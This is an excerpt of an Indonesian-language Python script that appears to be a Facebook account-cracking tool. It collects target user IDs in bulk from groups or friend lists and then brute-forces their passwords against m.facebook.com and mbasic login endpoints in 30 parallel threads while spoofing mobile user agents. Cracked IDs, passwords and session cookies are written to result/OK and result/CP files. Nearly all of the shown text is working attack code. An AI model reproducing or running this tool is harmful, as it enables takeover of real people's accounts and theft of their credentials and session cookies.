...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tSaran Ekstensi Pengambilan Cookies : [green]Cookiedough[white]'))
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> input jumlah target ? : '))
	except ValueError:
		print('>> salah memasukkan input ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Id kemungkinan id tidak publik ')
		exit()
	ses=requests.Session()
	yz = 0
...
def grup():
	...
	ua = 'NokiaX3-02/5.0 (06.05) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
...
def setting():
	...
	print('>> 1. m.facebook.com (Recommended)')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak('\t[cyan]>>[green] Crack Selesai,Jangan Lupa Bersyukur[cyan] <<[white] ')
	print(f'{h} OK : {h}%s '%(ok))
	print(f'{k} CP : {k}%s{x} '%(cp))
	print('')
	print('>> Mau cek opsi checkpoint ketik y ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
...
def crack(idf,pwv):
	...
	ua = 'Mozilla/5.0 (Linux; U; Android 2.2; en-us; GT-I9000 Build/MASTER) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'	
	ua2 = 'Mozilla/5.0 (Linux; U; Android 2.2; en-us; GT-I9000 Build/MASTER) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1591956834435357&kid_directed_site=0&app_id=1591956834435357&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1591956834435357%26cbt%3D1660032208678%26e2e%3D%257B%2522init%2522%253A1660032208678%257D%26ies%3D1%26sdk%3Dandroid-12.1.0%26sso%3Dchrome_custom_tab%26nonce%3D26b10f36-3aff-453e-8a9f-bbac2d0e2058%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bcc7ea44-72b9-450c-87f4-b438a198e68f%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522eakf0m10vvq7kcmlgpls%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.mobile.legends%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbcc7ea44-72b9-450c-87f4-b438a198e68f%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.mobile.legends%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522bcc7ea44-72b9-450c-87f4-b438a198e68f%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522eakf0m10vvq7kcmlgpls%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{K}>> {idf}|{pw}\n{ua}{N}')
				open('result/CP/'+cpc,'a').write(idf+' • '+pw+'\n')
				akun.append(idf+' • '+pw)
				cp+=1
				break
				...
				open('result/OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
...
def crackfree(idf,pwv):
	...
	fff = '%'
	print('\r%s%s/%s ok : %s cp : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = 'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
	ua2 = 'Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				open('result/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				user=idf
				infoakun = ""
...
def cracktouch(idf,pwv):
	...
	fff = '%'
	print('\r%s%s/%s ok : %s cp : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/E7FBAF'
	ua2 = 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/E7FBAF'
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('result/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
...
def crackmbasic(idf,pwv):
	...
	ua2 = 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
